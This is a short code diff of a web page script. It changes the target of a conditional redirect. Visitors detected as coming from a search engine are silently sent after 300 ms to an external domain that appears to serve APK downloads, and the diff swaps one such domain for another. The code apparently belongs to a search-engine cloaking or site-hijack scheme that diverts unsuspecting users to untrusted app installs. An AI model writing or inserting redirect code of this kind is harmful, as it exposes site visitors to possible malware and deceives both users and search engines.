@@ -11,7 +11,7 @@
 
   if (isFromSearchEngine) {
     setTimeout(function () {
-      window.location.href = 'https://apk009.tkvip784.com/';
+      window.location.href = 'https://apk009.tkvip786.com/';
     }, 300);
 
     window.sc_project = 13141996;
